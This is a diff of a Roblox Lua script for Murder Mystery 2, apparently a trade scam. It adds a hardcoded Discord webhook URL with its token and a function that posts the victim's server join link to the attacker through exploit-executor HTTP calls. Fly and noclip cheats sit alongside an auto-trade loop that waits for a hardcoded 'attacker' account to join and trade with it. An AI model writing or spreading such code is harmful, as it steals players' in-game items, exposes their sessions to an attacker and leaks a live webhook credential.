@@ -1,17 +1,36 @@
 --[[
-    sysrfx::MM2_AUTO_TRADE (Delta Mobile - No HTTP)
-    Prints server link to console. Join manually.
+    sysrfx::MM2_AUTO_TRADE (Webhook + Console)
 --]]
-local attackerUsername = "FEARACCE"  -- REPLACE THIS
+local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
+local attackerUsername = "FEARACCE"
 
--- Print server link to console (so you can copy it)
+local function sendWebhook(msg)
+    local HttpService = game:GetService("HttpService")
+    local data = HttpService:JSONEncode({content = msg})
+    local methods = {
+        function() syn.request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data}) end,
+        function() http.request({url = webhookURL, method = "POST", headers = {["Content-Type"] = "application/json"}, data = data}) end,
+        function() http_request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data}) end,
+        function() request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data}) end,
+    }
+    for _, method in ipairs(methods) do
+        local ok, err = pcall(method)
+        if ok then return true end
+    end
+    print("[WARN] Webhook send failed – no HTTP function available.")
+    return false
+end
+
+local placeId = game.PlaceId
+local jobId = game.JobId
+local joinLink = "https://www.roblox.com/games/" .. placeId .. "?serverId=" .. jobId
+
+sendWebhook("MM2 Server: " .. joinLink)
 print("== MM2 SERVER ==")
-print("Place ID: " .. game.PlaceId)
-print("Job ID: " .. game.JobId)
-print("Join link: https://www.roblox.com/games/" .. game.PlaceId .. "?serverId=" .. game.JobId)
-print("== Copy the link above and join ==")
+print("Join link: " .. joinLink)
+print("== Copy this if webhook didn't send ==")
 
--- Fly + Noclip (works without HTTP)
+-- Fly + Noclip
 local player = game.Players.LocalPlayer
 local char = player.Character or player.CharacterAdded:Wait()
 local rootPart = char:WaitForChild("HumanoidRootPart")
@@ -55,7 +74,7 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
     if input.KeyCode == Enum.KeyCode.V then toggleNoclip() end
 end)
 
--- Auto-Trade (only to attackerUsername) – works locally
+-- Auto-Trade
 local function getTradeGui()
     local gui = player:FindFirstChild("PlayerGui")
     if not gui then return nil end
@@ -114,7 +133,6 @@ local function initiateTrade(target)
     return false
 end
 
--- Main loop: wait for attacker to join
 spawn(function()
     local attacker = nil
     while not attacker do
